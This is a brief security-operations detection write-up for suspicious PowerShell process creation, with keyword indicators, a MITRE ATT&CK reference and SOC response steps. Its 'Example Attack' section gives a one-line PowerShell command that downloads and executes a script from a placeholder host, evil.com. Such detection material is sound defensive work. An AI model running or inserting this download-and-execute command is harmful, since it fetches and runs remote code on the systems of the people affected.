# Use Case: Suspicious PowerShell Execution

## Description
This detection identifies suspicious PowerShell commands that may indicate malicious activity.

## Log Source
Windows Security Log

## Event ID
4688 – Process Creation

## Detection Logic
Alert when PowerShell is executed with suspicious parameters such as:

- -nop
- -enc
- downloadstring
- IEX

## Example Attack

powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"

## MITRE ATT&CK
T1059.001 – PowerShell

## SOC Response
1. Investigate the process tree
2. Identify parent process
3. Check network connections
4. Isolate host if malicious
